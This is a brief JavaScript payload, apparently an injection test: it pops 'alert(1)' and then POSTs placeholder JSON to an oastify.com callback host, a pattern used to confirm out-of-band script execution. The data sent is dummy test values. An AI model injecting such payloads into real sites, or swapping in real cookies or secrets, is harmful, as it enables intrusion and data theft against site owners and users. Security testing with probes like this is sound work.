alert(1),
fetch("https://znq9vh92t2f4j3fwna1au6nfm6s4gu4j.oastify.com/", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    Test: "Test1",
    key2: "value2",
  }),
})
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
